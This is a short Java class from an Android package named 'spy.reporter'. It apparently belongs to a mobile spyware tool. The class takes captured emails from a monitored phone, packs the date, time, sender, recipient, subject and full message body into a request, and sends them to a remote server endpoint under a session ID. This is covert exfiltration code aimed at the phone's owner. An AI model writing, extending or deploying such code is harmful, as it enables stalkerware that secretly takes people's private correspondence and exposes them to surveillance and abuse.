package org.ddth.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import org.ddth.http.core.connection.Request;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.report.Email;

public class MailSpyReporter extends SpyReporter {

	@Override
	protected Request createRequest(Report report) {
		Email email = (Email) report;
		String date = LOG_DATE_FORMAT.format(email.date);
		String time = LOG_TIME_FORMAT.format(email.date);
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("content", date + "\t" + time + "\t" + email.from + "\t" + email.to + "\t" + email.subject + "\t" + email.body);
		return new Request(WEBAPI_SERVER_ROOT + "/email.php", parameters);
	}
}
